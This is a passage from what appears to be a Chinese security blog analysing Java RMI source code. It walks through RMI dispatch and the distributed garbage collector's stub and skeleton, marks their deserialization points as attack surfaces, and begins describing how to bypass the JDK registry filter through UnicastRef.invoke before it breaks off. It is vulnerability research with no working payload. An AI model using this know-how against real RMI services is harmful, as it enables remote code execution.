<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// positive operation number in 1.1 stubs;</span></span><br><span class="line">        <span class="comment">// negative version number in 1.2 stubs and beyond...</span></span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="type">long</span> op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// read remote call header</span></span><br><span class="line">            ObjectInput in;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in = call.getInputStream();</span><br><span class="line">                num = in.readInt();</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                        oldDispatch(obj, call, num);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                            <span class="string">&quot;skeleton class not found but required &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;for client version&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                op = in.readLong();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">                                             readEx);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">MarshalInputStream</span> <span class="variable">marshalStream</span> <span class="operator">=</span> (MarshalInputStream) in;</span><br><span class="line">            marshalStream.skipDefaultResolveClass();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> hashToMethod_Map.get(op);</span><br><span class="line">            <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;unrecognized method hash: &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;method not supported by remote object&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if calls are being logged, write out object id and operation</span></span><br><span class="line">            logCall(obj, method);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unmarshal parameters</span></span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            Object[] params = <span class="keyword">new</span> <span class="title class_">Object</span>[types.length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                unmarshalCustomCallData(in);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                    params[i] = unmarshalValue(types[i], in);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                    <span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                    <span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                call.releaseInputStream();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// make upcall on remote object</span></span><br><span class="line">            Object result;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = method.invoke(obj, params);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// marshal return value</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">                <span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">                    marshalValue(rtype, result, out);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, ex);</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * This throw is problematic because when it is caught below,</span></span><br><span class="line"><span class="comment">                 * we attempt to marshal it back to the client, but at this</span></span><br><span class="line"><span class="comment">                 * point, a &quot;normal return&quot; has already been indicated,</span></span><br><span class="line"><span class="comment">                 * so marshalling an exception will corrupt the stream.</span></span><br><span class="line"><span class="comment">                 * This was the case with skeletons as well; there is no</span></span><br><span class="line"><span class="comment">                 * immediately obvious solution without a protocol change.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            logCallException(e);</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">                e = <span class="keyword">new</span> <span class="title class_">ServerError</span>(</span><br><span class="line">                    <span class="string">&quot;Error occurred in server thread&quot;</span>, (Error) e);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">                e = <span class="keyword">new</span> <span class="title class_">ServerException</span>(</span><br><span class="line">                    <span class="string">&quot;RemoteException occurred in server thread&quot;</span>,</span><br><span class="line">                    (Exception) e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (suppressStackTraces) &#123;</span><br><span class="line">                clearStackTraces(e);</span><br><span class="line">            &#125;</span><br><span class="line">            out.writeObject(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            call.releaseInputStream(); <span class="comment">// in case skeleton doesn&#x27;t</span></span><br><span class="line">            call.releaseOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="hFSVM">客户端请求服务端-DGC</h2>
<h3 id="GmG3b">创建</h3>
DGC是RMI中分布式垃圾回收的模块

<p>之前我们看到，在静态表中，除了我们所创建的两个Target，还有一个DGC的Target，DGC这个类实际是在<code>DGCImpl.dgcLog.isLoggable(Log.VERBOSE)</code>这里被创建的，有人可能问，这里不是就简单的一行代码调用吗，我们之前讲过，调用一个类的静态变量时候，是会完成类的初始化的</p>
<p>我们在put Target的地方下一个断点，这里put的Target是一个动态代理类，说明在我们将Target放入静态表的时候，DGC已经被创建好并放入静态表中了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="type">ObjectEndpoint</span> <span class="variable">oe</span> <span class="operator">=</span> target.getObjectEndpoint();</span><br><span class="line">        <span class="type">WeakRef</span> <span class="variable">weakImpl</span> <span class="operator">=</span> target.getWeakImpl();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            DGCImpl.dgcLog.log(Log.VERBOSE, <span class="string">&quot;add object &quot;</span> + oe);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (tableLock) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Do nothing if impl has already been collected (see 6597112). Check while</span></span><br><span class="line"><span class="comment">             * holding tableLock to ensure that Reaper cannot process weakImpl in between</span></span><br><span class="line"><span class="comment">             * null check and put/increment effects.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (target.getImpl() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (objTable.containsKey(oe)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                        <span class="string">&quot;internal error: ObjID already in use&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (implTable.containsKey(weakImpl)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;object already exported&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                objTable.put(oe, target);</span><br><span class="line">                implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!target.isPermanent()) &#123;</span><br><span class="line">                    incrementKeepAliveCount();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Log</span> <span class="variable">dgcLog</span> <span class="operator">=</span> Log.getLog(<span class="string">&quot;sun.rmi.dgc&quot;</span>, <span class="string">&quot;dgc&quot;</span>,</span><br><span class="line">        LogStream.parseLevel(AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">GetPropertyAction</span>(<span class="string">&quot;sun.rmi.dgc.logLevel&quot;</span>))));</span><br></pre></td></tr></table></figure>

<p>在类初始化的时候实际上也是会走到它类中的静态代码块的位置，在静态代码块的中间，实际就new了一个DGCImpl，后续的创建方式，也就和创建注册中心的方法很类似了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * &quot;Export&quot; the singleton DGCImpl in a context isolated from</span></span><br><span class="line"><span class="comment">         * the arbitrary current thread context.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span></span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.currentThread().setContextClassLoader(</span><br><span class="line">                        ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Put remote collector object in table by hand to prevent</span></span><br><span class="line"><span class="comment">                     * listen on port.  (UnicastServerRef.exportObject would</span></span><br><span class="line"><span class="comment">                     * cause transport to listen.)</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();</span><br><span class="line">                        <span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);</span><br><span class="line">                        <span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);</span><br><span class="line">                        <span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref);</span><br><span class="line">                        <span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span></span><br><span class="line">                            Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line">                        disp.setSkeleton(dgc);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Permissions</span> <span class="variable">perms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                        perms.add(<span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;accept,resolve&quot;</span>));</span><br><span class="line">                        ProtectionDomain[] pd = &#123; <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="literal">null</span>, perms) &#125;;</span><br><span class="line">                        <span class="type">AccessControlContext</span> <span class="variable">acceptAcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessControlContext</span>(pd);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">                                <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line">                        ObjectTable.putTarget(target);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">                            <span class="string">&quot;exception initializing server-side DGC&quot;</span>, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    Thread.currentThread().setContextClassLoader(savedCcl);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在调用createProxy时候，stubClassExists还是会去检查，JDK中有没有DGCImpl_Stub，确实是有这个类的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现存在这个类，就将其实例化并返回true</p>
<p>和注册中心相类似，注册中心的端口用来注册服务，而DGC的端口是用来远程回收服务，只是端口不是确定的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735788239525-7f1f479a-3a3b-442f-a6ea-312ab5dbc460.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735788239525-7f1f479a-3a3b-442f-a6ea-312ab5dbc460.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="Bh065">功能</h3>
在DGCImpl_Stub中存在两个方法，可以理解为一个比较弱的清理，一个比较干净的清理

<p>下面的两个方法都存在风险点，他们都调用了UnicastRef的invoke方法，我们之前说过，这个方法存是存在风险的</p>
<p>还有一个就在dirty的var9.readObject()处，会进行一个反序列化操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, VMID var4, <span class="type">boolean</span> var5)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getOutputStream();</span><br><span class="line">                var7.writeObject(var1);</span><br><span class="line">                var7.writeLong(var2);</span><br><span class="line">                var7.writeObject(var4);</span><br><span class="line">                var7.writeBoolean(var5);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var8);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var6);</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var9;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var10;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">            Lease var24;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">                var24 = (Lease)var9.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var18);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var24;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var21;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var22) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var22;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var23);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们接下来看看服务端DGCImpl_Skel</p>
<p>其中有两个case，应该就是clean和dirty了，其中也是明显的几处反序列化的地方，都存在着攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">            ObjID[] var7;</span><br><span class="line">            <span class="type">long</span> var8;</span><br><span class="line">            <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    VMID var39;</span><br><span class="line">                    <span class="type">boolean</span> var40;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var14.readObject();</span><br><span class="line">                        var8 = var14.readLong();</span><br><span class="line">                        var39 = (VMID)var14.readObject();</span><br><span class="line">                        var40 = var14.readBoolean();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Lease var10;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var13.readObject();</span><br><span class="line">                        var8 = var13.readLong();</span><br><span class="line">                        var10 = (Lease)var13.readObject();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        var12.writeObject(var11);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="y6jlj">Java高版本绕过</h1>
在Java高版本中，在RegistryImpl类中新加了一个registryFilter方法，里面对所传入的序列化对象的类型进行了限制

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>其中有希望利用的只有Proxy和UnicastRef类，其中最重要的是UnicastRef类，在这个类中有一个invoke方法 ，在修复以后，客户端的被攻击点是没有被修复的，我们就想如果能让服务端去发送一个客户端请求，就会暴露出攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">            var1.executeCall();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var3);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error var4) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;error: &quot;</span>, var4);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var5) &#123;</span><br><span class="line">            